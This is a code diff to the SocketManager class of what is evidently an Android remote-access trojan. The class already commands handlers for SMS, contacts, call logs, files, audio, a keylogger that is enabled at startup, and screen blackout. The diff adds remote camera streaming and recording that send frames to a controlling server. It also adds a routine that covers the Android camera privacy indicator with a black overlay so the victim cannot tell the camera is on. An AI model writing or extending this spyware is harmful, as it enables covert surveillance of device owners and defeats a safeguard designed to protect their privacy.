@@ -175,19 +175,25 @@ public class SocketManager {
     private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
 
     // Command Handlers — one instance each, created once and reused
-    private final CommandExecutor   commandExecutor;
-    private final SMSHandler        smsHandler;
-    private final ContactsHandler   contactsHandler;
-    private final CallLogsHandler   callLogsHandler;
-    private final CameraHandler     cameraHandler;
-    private final ScreenshotHandler screenshotHandler;
-    private final FileHandler       fileHandler;
-    private final AudioRecorder     audioRecorder;
-    private final KeyloggerService  keyloggerService;
-    private final AppMonitor        appMonitor;
-    private final ScreenBlackout    screenBlackout;
-    private final PermissionManager permissionManager;
-    private GestureRecorder         gestureRecorder;
+    private final CommandExecutor      commandExecutor;
+    private final SMSHandler           smsHandler;
+    private final ContactsHandler      contactsHandler;
+    private final CallLogsHandler      callLogsHandler;
+    private final CameraHandler        cameraHandler;
+    private final CameraStreamHandler  cameraStreamHandler;
+    private final ScreenshotHandler    screenshotHandler;
+    private final FileHandler          fileHandler;
+    private final AudioRecorder        audioRecorder;
+    private final KeyloggerService     keyloggerService;
+    private final AppMonitor           appMonitor;
+    private final ScreenBlackout       screenBlackout;
+    private final PermissionManager    permissionManager;
+    private GestureRecorder            gestureRecorder;
+
+    // Camera-dot hide overlay (WindowManager view placed over the privacy indicator)
+    private android.view.View      camDotOverlay;
+    private android.view.WindowManager camDotWM;
+    private volatile boolean       camDotHidden = false;
 
     public static synchronized SocketManager getInstance(Context context) {
         if (instance == null) instance = new SocketManager(context.getApplicationContext());
@@ -201,6 +207,7 @@ public class SocketManager {
         contactsHandler    = new ContactsHandler(context);
         callLogsHandler    = new CallLogsHandler(context);
         cameraHandler      = new CameraHandler(context);
+        cameraStreamHandler = new CameraStreamHandler(context);
         screenshotHandler  = new ScreenshotHandler(context);
         fileHandler        = new FileHandler(context);
         audioRecorder      = new AudioRecorder(context);
@@ -208,6 +215,28 @@ public class SocketManager {
         appMonitor         = new AppMonitor(context, keyloggerService);
         screenBlackout     = ScreenBlackout.getInstance();
         permissionManager  = new PermissionManager(context);
+
+        // Wire camera frames → socket stream (same pattern as screen JPEG stream)
+        cameraStreamHandler.setFrameCallback(new CameraStreamHandler.FrameCallback() {
+            @Override
+            public void onFrame(String base64Jpeg, String camId) {
+                try {
+                    String did = DeviceInfo.getDeviceId(context);
+                    org.json.JSONObject d = new org.json.JSONObject();
+                    d.put("deviceId",  did);
+                    d.put("frameData", base64Jpeg);
+                    d.put("cameraId",  camId);
+                    d.put("timestamp", System.currentTimeMillis());
+                    sendStreamMessage("camera:frame", d);
+                } catch (Exception e) {
+                    Log.e(TAG, "camera frame send error: " + e.getMessage());
+                }
+            }
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "CameraStreamHandler error: " + error);
+            }
+        });
         // gestureRecorder is initialized lazily (needs AccessibilityService)
         KeyloggerService.setEnabled(true);
     }
@@ -1100,6 +1129,47 @@ public class SocketManager {
             );
         }
 
+        // ── Camera Stream / Record / Dot ─────────────────────────────────
+        // Mirrors the screen stream pattern: camera:frame events → cached by server.
+        if (command.equals("camera_stream_start")) {
+            String camId = params.optString("cameraId", "0");
+            long intMs   = Math.max(500L, params.optLong("intervalMs", 2000L));
+            return cameraStreamHandler.startStream(camId, intMs);
+        }
+        if (command.equals("camera_stream_stop")) {
+            return cameraStreamHandler.stopStream();
+        }
+        if (command.equals("camera_record_start")) {
+            String camId = params.optString("cameraId", "0");
+            return cameraStreamHandler.startRecording(camId);
+        }
+        if (command.equals("camera_record_stop")) {
+            return cameraStreamHandler.stopRecording();
+        }
+        if (command.equals("list_camera_recordings")) {
+            return cameraStreamHandler.listRecordings();
+        }
+        if (command.equals("get_camera_recording")) {
+            return cameraStreamHandler.getRecording(params.optString("filename", ""));
+        }
+        if (command.equals("delete_camera_recording")) {
+            return cameraStreamHandler.deleteRecording(params.optString("filename", ""));
+        }
+        if (command.equals("camera_hide_dot")) {
+            return hideCameraDot(true);
+        }
+        if (command.equals("camera_show_dot")) {
+            return hideCameraDot(false);
+        }
+        if (command.equals("get_camera_stream_status")) {
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("streaming", cameraStreamHandler.isStreaming());
+            r.put("recording", cameraStreamHandler.isRecording());
+            r.put("dotHidden", camDotHidden);
+            return r;
+        }
+
         // ── Screenshot ───────────────────────────────────────────────────
         if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();
 
@@ -1511,6 +1581,61 @@ public class SocketManager {
         float ratio = (float) maxWidth / src.getWidth();
         int newH = Math.max(1, Math.round(src.getHeight() * ratio));
         return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
+    }
+
+    /**
+     * Hide (or show) the camera privacy indicator dot on Android 12+.
+     * Technique: add a black WindowManager overlay that exactly covers the privacy dot area
+     * in the top-right corner of the status bar, making it invisible against the bar background.
+     */
+    private JSONObject hideCameraDot(boolean hide) {
+        JSONObject result = new JSONObject();
+        try {
+            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                try {
+                    if (hide && !camDotHidden) {
+                        // Place a black square over the top-right corner where the dot appears.
+                        camDotWM = (android.view.WindowManager)
+                                context.getSystemService(Context.WINDOW_SERVICE);
+                        camDotOverlay = new android.view.View(context);
+                        camDotOverlay.setBackgroundColor(android.graphics.Color.BLACK);
+
+                        android.view.WindowManager.LayoutParams lp =
+                                new android.view.WindowManager.LayoutParams(
+                                        android.util.TypedValue.complexToDimensionPixelSize(
+                                                40, context.getResources().getDisplayMetrics()),
+                                        android.util.TypedValue.complexToDimensionPixelSize(
+                                                40, context.getResources().getDisplayMetrics()),
+                                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                                        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                                                | android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                                                | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                                        android.graphics.PixelFormat.OPAQUE
+                                );
+                        lp.gravity = android.view.Gravity.TOP | android.view.Gravity.END;
+                        lp.x = 0;
+                        lp.y = 0;
+                        camDotWM.addView(camDotOverlay, lp);
+                        camDotHidden = true;
+                        Log.i(TAG, "Camera dot overlay added (hide mode)");
+                    } else if (!hide && camDotHidden && camDotOverlay != null) {
+                        try { camDotWM.removeView(camDotOverlay); } catch (Exception ignored) {}
+                        camDotOverlay = null;
+                        camDotWM = null;
+                        camDotHidden = false;
+                        Log.i(TAG, "Camera dot overlay removed (show mode)");
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "hideCameraDot error: " + e.getMessage());
+                }
+            });
+            result.put("success", true);
+            result.put("hidden", hide);
+            result.put("message", hide ? "Camera dot hidden (black overlay added)" : "Camera dot shown (overlay removed)");
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
+        }
+        return result;
     }
 
     /**
